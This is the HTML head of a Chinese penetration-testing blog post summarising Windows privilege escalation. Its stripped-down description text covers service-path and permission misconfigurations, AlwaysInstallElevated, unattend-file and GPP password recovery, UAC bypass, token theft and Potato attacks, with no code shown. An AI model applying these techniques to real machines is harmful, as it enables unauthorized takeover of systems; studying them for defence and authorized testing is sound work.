<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>Windows提权总结 | hybcx</title><meta name="keywords" content="Windows提权"><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="Windows提权总结"><meta name="application-name" content="Windows提权总结"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="Windows提权总结"><meta property="og:url" content="http://hybcx.xyz/2024/08/05/windows-ti-quan-zong-jie/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="0x01 简介 提权可分为纵向提权与横向提权：纵向提权：低权限角色获得高权限角色的权限；横向提权：获取同级别角色的权限。 Windows常用的提权方法有：系统内核溢出漏洞提权、数据库提权、错误的系统配置提权、组策略首选项提权、WEB中间件漏洞提权、DLL劫持提权、滥用高危权限令牌提权、第三方软件&amp;#x2F;服"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta name="description" content="0x01 简介 提权可分为纵向提权与横向提权：纵向提权：低权限角色获得高权限角色的权限；横向提权：获取同级别角色的权限。 Windows常用的提权方法有：系统内核溢出漏洞提权、数据库提权、错误的系统配置提权、组策略首选项提权、WEB中间件漏洞提权、DLL劫持提权、滥用高危权限令牌提权、第三方软件&amp;#x2F;服"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2024/08/05/windows-ti-quan-zong-jie/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: {"appId":"Z7A3XW4R2I","apiKey":"12db1ad54372045549ef465881c17e743","indexName":"my-hexo-blog","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: 'Windows提权总结',
  postAI: '',
  pageFillDescription: '0x01 简介, Windows 权限划分, 0x02 提权信息搜集, 基本信息, 获取系统安装的软件信息, 获取系统补丁情况, 获取系统注册的服务信息, 获取在线主机信息, 收集本地用户和组信息, 获取本地共享信息, 获取IP信息, 获取本地端口开放与连接信息, 查看本地的计划任务, 列出iis的站点, 保存系统上所有注册表信息, 获取系统日志信息, 0x03 系统内核溢出漏洞提权, 手动查找系统潜在漏洞, 自动查找系统潜在漏洞, Windows Exploit Suggester, local_exploit_suggester 模块, enum_patches 模块, 选择漏洞并利用, 0x04 系统错误配置漏洞提权, 可信任服务路径漏洞, 错误权限配置漏洞, 1. 利用PowerUp.ps1脚本, 2. service_permissions 模块, 不安全的注册表权限配置, 注册表键AlwaysInstallElevated, 自动安装配置文件, MSF模块, PowerUp的模块, 计划任务, 0x05 组策略首选项提权, 相关知识, SYSVOL, 组策略偏好GPP, powershell获取cpassword, MSF获取cpassword, 其他, 0x06 绕过UAC提权, 基本知识, MSF模块利用, PowerShell脚本, 其他, 0x07 令牌窃取提权, 基本知识, 程序 incognito.exe, Invoke-TokenManipulation.ps1脚本, MSF模块, 0x08 Potato提权, 基本知识, Windows服务的登录账户, Windows Token, Hot Potato, 影响范围, NBNS协议, NBNS 欺骗, WPAD 代理, HTTP -gt SMB NTLM Relay, 攻击流程, RottenPotato amp JuicyPotato, 原理, 攻击流程, PrintSpoofer (PipePotato or BadPotato), 原理, RoguePotato, 原理, 攻击流程, SweetPotato, Ghost potato, 原理, 0x09 数据库提权, MySQL提权, 查找root密码, Mysql提权, 0x10 其他类型提权, at命令提权, 本地提权, 配合MSF提权, sc命令提权, 0x11 常用工具, 0x12 参考文章简介提权可分为纵向提权与横向提权纵向提权低权限角色获得高权限角色的权限横向提权获取同级别角色的权限常用的提权方法有系统内核溢出漏洞提权数据库提权错误的系统配置提权组策略首选项提权中间件漏洞提权劫持提权滥用高危权限令牌提权第三方软件服务提权等提权的思路最重要的就是信息收集我们只有对整个系统进行了较全面的信息收集大概对整个系统有了一定的了解后我们才能高效且精准的完成提权比方说我们收集到这个系统是的系统和里面的一些相关配置我们能联想到什么提权方法呢是不是可以先利用自动化工具和先去尝试针对低版本的系统命令进程迁移令牌窃取劫持不安全的服务手工提权这么一个流程权限划分普通用户权限系统中最安全的权限分配给该组的默认权限不允许成员修改操作系统的设置或用户资料管理员权限可以利用的机制将自己提升为权限以便操作文件等系统权限可以对等敏感文件进行读取往往需要权限提升到权限才可以对散列值进行操作最高权限对于系统文件即使权限也无法进行修改只有权限才可以修改文件提权信息搜集对于系统的基本信息一般包括主机名所属域环境变量等涉及的命令如下基本信息常见使用命令查询系统信息如果要查看特定的信息可以使用名称版本主机名环境变量查看用户信息查看服务号查看系统名查看补丁信息如果要定位到特定的补丁可以使用如下命令查询本机服务查询本机进程查看当前安装程序或者获取在线某些版本命令不存在分析安装杀软获取远程端查看防火墙配置获取主机名或者获取所属域信息从这个命令中不只是可以看到有关域名的信息还有很多有用的信息比如开机时间安装时间补丁修补情况系统版本等信息获取环境变量从环境变量中可以看出用户的一些常用软件临时文件的目录以及与用户相关的一些信息获取系统安装的软件信息通过获取软件安装信息我们可以从中找出我们可以利用的软件或者可以获取到进一步权限信息的软件比如等软件也可以大概了解系统的安全防护软件的情况可以利用注册表来获取这些信息命令如下导出注册表信息匹配出注册表信息中的软件获得最终结果最终结果截取部分内容如图网上扒的获取系统补丁情况获取补丁修补信息可以在我们进行提权操作的时候起到指导性的作用根据其补丁情况来使用溢出提权虽然前面的命令可以获取补丁的情况但是其获取的内容不是很完整只能看到补丁的编号下面这条命令可以获取完整的补丁信息是一个非常强大的工具可以做很多事情在渗透测试中有很多机会使用它部分截图如下获取系统注册的服务信息从服务信息中可以看出本系统提供哪些服务针对不同的服务器有不同的利用方式命令如下获取在线主机信息通常我们获取在线主机的方式是扫描段在域的内网中我们可以通过一条命令获取主机在同一网段或者有联系的主机列表命令如下由于本地没有域环境因此上述命令会报错收集本地用户和组信息这个在内网渗透测试中至关重要这是在任何一台主机上都要执行的命令这个命令的作用包括判断主机是否正在域中主机管理员组是什么本地管理员用户有哪些等等获取本地用户组获取本地用户获取本地管理员信息获取本地共享信息本地共享目录也是我们需要关注的目录这里面可能会有很多对我们提升权限有帮助的重要文件命令如下网上扒一个图获取信息其实这个命令是一开始就应该执行的从这个命令结果中可以大概看出内网的网络环境服务器域名信息等命令如下获取本地端口开放与连接信息这里可以看出本地系统开放了哪些端口大概看出提供哪些服务以及有哪些内网主机与本机进行数据交流这里也可以看出一些内网中存活的主机列表命令如下部分结果如图查看本地的计划任务从计划任务中我们可以了解这台主机每天做哪些任务或者当前用户经常做哪些操作甚至可以通过计划任务信息可以获取到用户另外的帐号密码信息命令如下或这两条命令必须在系统权限下才可以执行否则会提示拒绝访问列出的站点在安装了服务的系统上我们可以执行以下命令来获取站点信息保存系统上所有注册表信息这几个命令比较暴力有时候我们需要多次查询注册表信息这样就需要执行很多条命令我们可以把系统的所有注册表信息下来本地分析可以尽量减少执行命令的次数减少日志量减少被发现的几率获取系统日志信息日志信息不管在任何系统上都是非常重要的所以在信息收集方面收集日志信息是必不可少的操作获取日志的方式有两种一种是可以将系统的日志复制回本地分析一种是使用官方的工具将日志导出然后保存到本地复制日志文件使用工具导出系统内核溢出漏洞提权内核溢出漏洞提权通过系统本身存在的一些漏洞未曾打相应的补丁而暴露出来的提权方法依托可以提升权限的和它们的补丁编号进行提升权限本地溢出提权首先要有服务器的一个普通用户权限攻击者通常会向服务器上传本地溢出程序在服务器端执行如果系统存在漏洞那么将溢出权限上系统溢出漏洞提权的汇总实战中最常用的本地溢出提权有和在中最常用的提权模块是在中最常用的提权模块的是这四个提权都有对应的程序程序均支持和位的机器手动查找系统潜在漏洞获取目标主机的一个普通用户的后执行如下命令查看目标系统上安装了那些补丁直接找是否存在对应的补丁可以看到系统就装了这几个补丁攻击者会通过没有列出的补丁号寻找相应的提权例如和对应和对应等等然后使用目标机上没有的安装的补丁号对应的进行提权不同系统提权的漏洞和相应的补丁请见点我呀是的简称它是一款命令行管理工具提供了从命令行接口到批命令脚本执行系统管理的支持可以说是平台下最有用的命令行工具使用我们不但可以管理本地计算机还可以管理统一局域网内的所有远程计算机需要必要的权限而被管理的计算机不必事先安装自动查找系统潜在漏洞下载地址该工具可以将系统中已经安装的补丁程序与微软的漏洞数据库进行比较并可以识别可能导致权限提升的漏洞而且其只需要我们给出目标系统的信息即可使用如下首先更新漏洞数据库会生成一个的文件如下这里有个小问题首先下载好更新了数据库之后需要安装一个依赖依赖项目中有说明之后更新数据库按理来说更新的文件后缀应为可我这里是如果直接用则会报错以上是我在虚拟机的情况我们可以在本地更新后打开另存为具体呢推荐如下图所示的格式其他形式还未尝试大家感兴趣可以测试注意必须为环境然后执行如下命令查看目标主机系统信息保存为文件最后运行如下命令查看该系统是否存在可利用的提权漏洞如上图执行后给出了一些目标系统存在的漏洞模块内置模块提供了各种可用于提权的并会基于架构平台即运行的操作系统会话类型和所需默认选项提供建议这极大的节省了我们的时间省去了我们手动搜索的麻烦使用如下假设我们已经获得了目标主机的一个这里我就搜了篇文章对靶机获取一下其所需环境攻击机靶机在终端中打开控制台开启监听设置监听位位说明有效载荷通俗的讲是用来建立目标机与攻击机稳定连接的可以返回编码方式编码次数在生成的程序中避免出现的值生成格式不过操作下来发现没必要非得写位对应的命令反而这个命令还报错不知是否为我的失误将该文件上传到靶机中在控制台下使用环境执行命令搭建一个服务提供一个页面供靶机浏览一定是在管理员模式下执行此命令不过这里不用搞默认端口即可值得注意的是才可以打开目标机输入地址进行下载木马并保存在桌面上图为下载的回显返回第二步界面设置监听主机运行可以看到得到了查看如果此时是输入即可返回查看系统信息截取时下桌面捕获击键记录控制键盘鼠标启用禁用参考文章获取一个普通的控制这里也是发现了二十几个该模块快速识别并列出了系统中可能被利用的漏洞十分方便但虽然如此也并非所有列出的都可用模块会用中的模块可以根据漏洞编号快速找出系统中缺少的补丁使用如下这里直接贴一个网上的图在实际的查找潜在漏洞的过程中建议手动和自动双管齐下下载地址该脚本可以快速的查找出可能用于本地权限提升的漏洞使用如下远程执行导入模块如果提示未能加载指定模块则可能是权限问题以管理员权限运行然后输入如下代码输入如下命令可以查看帮助信息调用脚本后执行搜索命令这里总是报错我就下载到本地了这里搜索的时间较长耐心等待另外还找到一个模块查看系统可能存在的可以利用的漏洞贴个图选择漏洞并利用查找了目标机器上的补丁并确定存在漏洞后我们就可以对目标机器上传本地溢出程序并执行这里我们选择的是漏洞利用程序可以从以下几个地址中下载里面附有使用说明下的提权大合集内核溢出漏洞提权大全各大平台提权工具这里下载的时候注意将文件放入相应目录在执行如上命令如上图再执行提权程序之前为普通用户权限执行后为权限上完整操作如下但我这里似乎没成功另外这个也可以直接使用的模块设置之后运行即可如下图可以看到成功提权系统错误配置漏洞提权在系统中攻击者通常会通过系统内核溢出漏洞来提权但是如果碰到无法通过系统内核溢出漏洞提权的情况时会可以利用系统中的错误配置漏洞来提权下面演示几种常见的系统错误配置漏洞提权方法可信任服务路径漏洞漏洞是由系统中的函数引起的并利用了文件路径解析的特性首先我们来认识一下中文件路径解析的特性例如我们有一个文件路径为那么对于该路径中的每一个空格都会尝试寻找并执行与空格前面的名字相匹配的程序如上面的目录为例会依次尝试确定和执行以下程序可见最后才确定并执行真正的程序而由于服务通常是以权限运行的所以系统在解析服务所对应的文件路径中的空格时也会以系统权限进行那么如果我们将一个适当命名的可执行程序上传到以上所说的受影响的目录中服务一旦启动或重启该程序就会以权限运行了可见该漏洞利用了服务路径的文件文件夹的权限该漏洞是由于一个服务的可执行文件没有正确的处理所引用的完整路径名即一个服务的可执行文件的完整路径中含有空格且没有被双引号引起来那么该服务就存在这个漏洞下面演示该漏洞利用方法首先我们可以用以下命令列出目标主机中所有存在空格且没有被引号括起来服务路径如上图可以看到和这两个服务对应的二进制文件路径没有引号包含起来并且路径中包含空格是存在该漏洞的但在上传可执行文件进去之前我们需要确定我们对目标文件夹是否有写入的权限这里我们使用中的命令依次来检查等目录的权限发现只有目录有参数说明表示修改代表完全控制代表从属容器将继承访问控制项代表从属文件将继承访问控制项这就意味着对该目录有读写删除其下的文件删除该目录下的子目录的权限确认目标机器中存在此漏洞后把要上传的程序重命名并放置在存在此漏洞且可写的目录下执行如下命令尝试重启服务我们生成一个马并重命名为上传到该目录下然后分别执行如下命令重启该服务如下图完整利用过程可知提权前为管理员权限提权成功后我们得到一个权限的这里要注意新反弹得到的会很快就中断了这是因为当一个进程在中启动后必须与服务控制管理进行通信如果没有通信服务控制管理器会认为出现了错误进而终止这个进程所以我们要在终止载荷进程之前将它迁移到其他进程中使用的命令即可实现自动迁移进程该提权方法在中对应的模块为使用如下在之前的中为但在新版的中替换替换成了错误权限配置漏洞系统服务文件在操作系统启动时加载和执行并在后台调用可执行文件因此如果一个低权限的用户对此系统服务调用的可执行文件拥有写权限就可以将该文件替换成任意可执行文件并随着系统服务的启动获得系统权限服务是以权限运行的因此其文件文件夹和注册表键值都是受强访问控制机制保护的但是在某些情况下操作系统中仍然存在一些没有得到有效保护的服务该漏洞利用有以下两种情况服务未运行攻击者会使用任意服务直接替换原来的服务然后重启服务服务正在运行且无法终止这种情况符合绝大多数漏洞利用的场景攻击者通常会利用劫持技术并尝试重启服务来提权利用脚本下载地址这里我们利用一个的脚本该脚本的模块会检测目标主机存的服务漏洞然后通过直接替换可执行文件本身来实现权限的提升模块的通常应用对象如下没有被引号引起来的服务的路径服务的可执行文件的权限设置不当文件注册表键将该脚本远程下载或本地导入后执行命令进行漏洞检测如上图可以看到列出了所有可能存在该漏洞的服务的信息并在部分直接给出了利用方式我们可以看到目标主机的服务可能存在该漏洞然后我们再用命令来测试该服务的可执行文件目录的文件是否有写入权限如上图可以看到我们对文件是有完全控制权的那么我们就可以直接将替换成我们的马当服务重启时我们就会得到一个权限的这里我们用那里已经给出的具体操作方式执行如下将原来的服务可执行文件备份并用一个可添加管理员用户的恶意可执行文件代替它默认添加的用户名为密码为服务名接下来停止并再启动该服务的时候但由于我们当前是普通用户我们没有权限重启服务所以我们可以等目标系统重启我们通过控制目标机执行命令来重启重启后即可成功创建用户添加指定的管理员用户服务名执行命令服务名后加要执行的命令模块该漏洞提权在上面对应的模块为如上图该模块有两个可以设置的选项其中如果把选项设为则可以利用目标机器上每一个有该漏洞的服务设为则在第一次提权成功后就会停止工作演示如下当然还是需要迁移进程不安全的注册表权限配置在中和服务有关的信息存储在注册表项中服务对应的程序路径存储服务名如果低权限用户对这个键值有写权限那么就可以控制这个服务运行我们的程序拿到高权限以服务为例服务对应的程序路径存储在中如果我们对这一键值有写入权限就可以修改服务对应的程序路径让系统以权限运行我们的程序从而达到提权的目标如下所示我们可以使用工具去检查注册表项的权限建议本地安装后找到拷贝到目标机器上运行如果我们对注册表有写入权限就可以修改注册表使得服务启动时运行我们的恶意程序在下一次启动该服务时将会以权限运行成功提权后记得修改回配置注册表键并且还有版本的前提允许低权限用户以权限安装文件如果启用此策略设置项那么任何权限的用户都以权限来安装恶意的文件防御方法只要禁用注册表键就可以阻止攻击者通过文件进行提权查看是否启用当然也可以查看注册表键值是否被定义如果系统没这个漏洞它将输出错误如果存在漏洞上面将输出以下内容利用方式利用方法启用后可以通过命令行调用安装文件文件内包含要执行的将会以权限执行先利用生成文件之后进行安装安装过程中禁止向用户发送消息不使用安装程序当然也可以使用模块进行利用该模块会创建一个文件名随机的文件并在提权后删除所有已部署的文件设置之后即可自动安装配置文件网络管理员在内网中给多台机器配置同一个环境时通常不会逐个配置而是使用脚本批量部署在这个过程中会使用安装配置文件这些文件中包含所有的安装配置信息其中一些还可能包含管理员账号和密码这种解决方案用于在拥有较多雇员和时间紧缺的较大型组织中部署程序如果管理员没有进行清理的话那么会有一个名为的文件残存在系统上这个文件包含所有在安装程序过程中的配置包括一些本地用户的配置以及管理员账户全盘搜索文件是个好办法它通常会在以下一个文件夹中在这些文件中通常包含用户名和密码密码使用编码并且在最后会附加所以真正的密码需要去掉最后的可以用以下命令来全盘搜索文件或者在名称中包含关键词的项目或者可以在文件内容中搜索之类的关键字可以查询注册表例如字符串显示指定目录和所有子目录中的文件除了文件外还要留意系统中的和文件这些文件中都会包含部署操作系统时使用的凭据信息这些信息可以帮助我们提权打开文件之后格式为格式然后可以进行搜索或者经过加密的密码因为我们只需要这部分例如在这个文件中我们可以看到一个本地账户被创建并加入到了管理员组中管理员密码没有以明文形式显示但是显然密码是以进行编码的解密得密码为但是微软在进行编码前会在文件中所有的密码后面都追加所以我们本地管理员的密码实际上是模块这里中也集成了相应的模块贴上网上的原图同样的设置完之后即可的模块计划任务如果攻击者对以高权限运行的任务所在的目录具有写权限就可以使用恶意程序覆盖原来的程序这样在下次计划执行时就会以高权限来运行恶意程序查看计算机的计划任务如上图我们可以看到在目录有一个程序它会在一个时间点自动运行它会在计算机每次启动时运行并且是用权限运行的然后让我们看下我们对这个计划任务的路径是否有写入权限查看指定目录的权限配置情况可以清楚地看到这里有一个很严重的配置错误对于这个计划任务来说这里不仅用了权限来运行更糟糕的是任何经过身份验证的用户都对这个文件夹有写入的权限所以我们可以生成一个木马做一个后门就可以了在本次演示例子中我们可以简单的用木马覆盖掉原来的如下图我们将原来的备份后上传我们自己生成的木马然后重开一个设置好监听接下来对目标机执行重启命令让其重新启动重新启动目标主机后在另一个上面即可得到权限的常用命令第一次运行工具包里的工具时会弹出一个许可协议对话框使用参数自动接受许可协议查看某个驱动器下所有权限配置有问题的文件夹查看某个驱动器下所有权限配置有问题的文件如上图可以看到对这个目录下的每一个文件它都列出了用户组的权限为读权限为写权限表示有读写权限如果前面为空则表示没有权限根据前面这几个提权的思路当我们检查文件或文件夹权限的时候需要考虑哪些点是易受攻击的点你需要花费时间来检查所有的启动路径服务计划任务和启动项等组策略首选项提权引入了一项新功能策略首选项组策略首选项使管理员可以部署影响域中计算机用户的特定配置通过在组策略管理控制台中配置的组策略首选项管理员可以推出多种策略例如当用户登录其计算机时自动映射网络驱动器更新内置管理员帐户的用户名或对注册表进行更改相关知识是活动目录里面一个存储域公共文件服务器副本的共享文件夹所有的认证用户都可以读取包括登录脚本组策略数据以及其他域控所需要的域数据这是因为能在所有域控里进行自动同步和共享所有组策略均存储在组策略偏好发布了其中最有用的特性是在某些场景存储和使用凭据其中包括映射驱动创建本地用户数据源打印机配置创建更新服务计划任务更改本地密码此处的漏洞就是为方便管理网络管理员会使用域策略进行统一的配置和管理那么所有机器的本地管理员密码就是一样的造成了即使不知道密码的情况下也能修改组策略首选项的密码也可以通过脚本破解组策略首选项文件中密码的漏洞这里简单找网上一个环境配置示例创建组策略批量修改域中机器的本地管理员密码在域控上执行开始运行输入选择右键组策略对象新建我这里新建一个组策略右键刚刚新建的组策略编辑会弹出一个组策略管理编辑器然后计算机配置首选项控制面板设置本地用户和组右键本地用户和组新建本地用户我们将域中每个计算机的本地密码设置成然后将添加到组策略应用的组中强制更新组策略至此错误的组策略配置算是完成了获取组策略的凭据管理员在域中新建一个组策略后操作系统会自动在共享目录中生成一个文件该文件中保存了该组策略更新后的密码该密码使用加密算法安全性还是比较高的但是年微软在官方网站上公布了该密码的私钥导致保存在文件中的密码的安全性大大降低任何域用户和域信任的用户均可对该共享目录进行访问这就意味着任何用户都可以访问保存在文件中的密码并将其解密从而控制域中所有使用该账号密码的本地管理员计算机在中搜索可以找到文件找到其中的字段该字段是用算法加密的加密后的密文获取中的脚本可以获取组策略中的密码注意我们只需要在域内任何一台以域用户权限登录的机器上均可查询到获取中模块可以获取组策略中的密码注意我们只需要获取域内任何一台以域用户权限登录的机器的权限即可其他的模块检索通过组策略首选项推送的帐户的明文密码和其他信息命令破解密码绕过提权用户帐户控制它是的一个安全功能它支持防止对操作系统进行未经授权的修改确保仅在管理员授权的情况下进行某些更改通过阻止程序执行任何涉及有关系统更改特定任务的任务来运行除非尝试执行这些操作的进程以管理员权限运行否则这些操作将无法运行如果您以管理员身份运行程序则它将具有更多权限因为它将被提升权限而不是以管理员身份运行的程序不会自动阻止恶意软件其目的不是确定程序是否是恶意软件而是在没有用户许可下对恶软件的未授权行为进行掌控基本知识一些没有管理员权限无法完成的操作注册表修改如果注册表项在下因为它影响多个用户它将是只读的加载设备驱动程序注入修改系统时间时钟修改用户帐户控制设置通过注册表可以启用禁用该设置但您需要正确的权限才能执行此操作修改受保护的目录例如文件夹计划任务例如以管理员权限自动启动需要的授权才能进行的操作列表如下配置增加删除账户更改账户类型更改的设置安装安装卸载程序安装设备驱动程序将文件移动复制到或目录下查看其它用户的文件夹有如下四种设置要求始终通知这是最严格的设置每当有程序需要使用高级别的权限时都会提示本地用户仅在程序试图更改我的计算机时通知我这是的默认设置当本地程序要使用高级别的权限时不会通知用户但是当第三方程序要使用高级别的权限时会提示本地用户仅在程序试图更改我的计算机时通知我不降低桌面的亮度与上一条设置的要求相同但在提示用户时不降低桌面的亮度从不提示当用户为系统管理员时所有程序都会以最高权限运行模块利用弹出确认窗口点击后获得权限此模块将通过进程注入使用可信任发布者证书绕过它将生成关闭标志的第二个此模块将通过进程注入使用可信任的发布者证书绕过它将生成关闭标志的第二个在普通技术中该模块使用反射式注入技术并只除去了二进制文件而不是三个单独的二进制文件但是它需要选择正确的体系架构对于系统也使用如果指定应在单独的进程中启动后调用此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动应用程序时调用的自定义命令来绕过它将生成关闭标志的第二个此模块修改注册表项但在调用后将清除该项该模块不需要的体系架构和操作系统匹配如果指定则应在单独的进程中启动后调用此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动事件查看器时调用的自定义命令来绕过它将生成关闭标志的第二个此模块修改注册表项但在调用后将清除该项该模块不需要的体系架构和操作系统匹配如果指定则应在单独的进程中启动后调用此模块将通过在配置单元中创建处理程序注册表项来绕过当加载某些较高完整性级别进程时会引用这些注册表项从而导致进程加载用户控制的这些包含导致会话权限提升的此模块修改注册表项但在调用后将清除该项这个模块需要的体系架构和操作系统匹配但是当前的低权限会话体系架构中可能不同如果指定则应在单独的进程中启动后调用此模块通过目标上的调用目标二进制文件因此如果访问受到限制此模块将无法正常运行针对上述模块具体也可参考文章使用绕过的多种方法中模块的使用前提有两个一是系统当前用户必须在管理员组中二是用户账户控制程序设置为默认即仅在程序试图更改我的计算机时通知我使用模块需要使用选项创建一个可执行文件需要免杀目标机器会运行一个发起提升权限请求的程序提示用户是否要继续运行如果用户选择继续运行程序就会返回一个高权限的使用该模块的前提当前用户必须在管理员组中或知道管理员的密码对的设置则没有要求用户需要手动点击弹出的程序是脚本模块使用来自项目的绕过使用方法并执行默认的使用方法并执行默认的可以看到成功添加用户没有提示拒绝访问普通用户权限会提示拒绝访问其他令牌窃取提权简介令牌是系统的临时秘钥相当于账号和密码用来决定是否允许这次请求和判断这次请求是属于哪一个用户的它允许你在不提供密码或其他凭证的前提下访问网络和系统资源这些令牌将持续存在于系统中除非系统重新启动令牌有很多种访问令牌表示访问控制操作主体的系统对象会话令牌是交互会话中唯一的身份标识符密保令牌又叫做认证令牌或硬件令牌是一种计算机身份校验的物理设备例如盾基本知识的有两种类型授权令牌它支持交互式会话登录例如本地用户直接登录远程桌面登录访问模拟令牌它是非交互的会话例如使用访问共享文件夹产生过程每个进程创建时都会根据登录会话权限由分配一个如果时自己指定了会用该否则就用父进程的一份拷贝的窃取与利用的窃取与利用需要管理员组权限窃取的数量程序脚本里的模块程序找了一下这个网址没了看到有一个不知道是否有用的列举需要权限模拟其他用户的令牌完整的名例如模拟权限用户脚本这个脚本是下文件夹内的一个脚本使用命令如下列举提权至复制进程复制线程模块需要权限加载列出模拟用户命令即实现了该命令如果要模拟其他用户将名改为其他用户即可返回到之前的权限域内的话可以添加域用户并添加进域管理组进行敏感操作比这种好得多的还有烂土豆提权多汁土豆提权优点就是比较可靠而且版本通杀提权或投毒让某些高权限系统服务请求自己监听的端口并要求认证然后到本地的通过来使服务向攻击者监听的端口发起连接并进行认证需要权限的加强版需要两个权限无利用进程的服务器强制主机向其他计算机进行身份验证需要权限的集合版也就是从到的本地服务到特权升级需要权限基本知识简单对上述提权原理有个了解日后遇到的时候具体感受利用提权手法的前提是拥有或权限以下用户拥有权限而只有更高权限的账户比如才有权限本地管理员账户不包括管理员组普通账户和本地服务帐户由启动的服务注意本机测试时即使在本地策略中授予管理员组普通用户特权在中也不显示该特权且无法利用而特权则可以正常授予普通用户服务的登录账户它在本地系统上具有最高级别的权限如果客户端和服务器都在域中则本地系统帐户使用帐户登录远程计算机如果客户端或服务器不在域中则本地系统帐户使用匿名登录它具有本地系统上无特权普通用户的权限访问网络时其行为与本地系统帐户相同它具有本地系统上无特权普通用户的权限无论计算机是否在域中它始终使用匿名登录也就是说该提权是的是描述安全上下文的对象用户登录系统后就会生成创建新进程或新线程时这个会被不断拷贝成员用户账户的用户所属的组的用于标识当前登陆会话的登陆用户或用户组所拥有的权限列表所有者所有者组的访问控制列表访问令牌的来源主令牌模拟令牌限制的可选列表模拟等级无法模拟或识别可识别的身份和特权不能模拟可在本地系统模拟可在远程系统